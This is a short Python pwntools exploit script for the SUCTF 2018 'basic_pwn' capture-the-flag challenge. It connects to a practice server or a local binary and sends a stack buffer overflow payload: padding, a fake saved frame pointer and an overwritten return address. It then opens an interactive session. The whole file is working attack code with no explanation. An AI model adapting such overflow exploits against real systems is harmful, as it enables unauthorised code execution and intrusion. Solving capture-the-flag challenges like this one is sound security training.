#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 15.40.55
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./SUCTF_2018_basic_pwn')
	sh = process('./SUCTF_2018_basic_pwn')
else:
	#context.log_level = 'debug'
	# libc=ELF('null')
	elf = ELF('./SUCTF_2018_basic_pwn')
	sh = remote('node3.buuoj.cn',25057)



def pwn():
	payload = 'A'*0x110 + p64(0xdeadbeef) + p64(0x0000000000401157)
	sh.sendline(payload)


if __name__ == '__main__':
	pwn()
	sh.interactive()

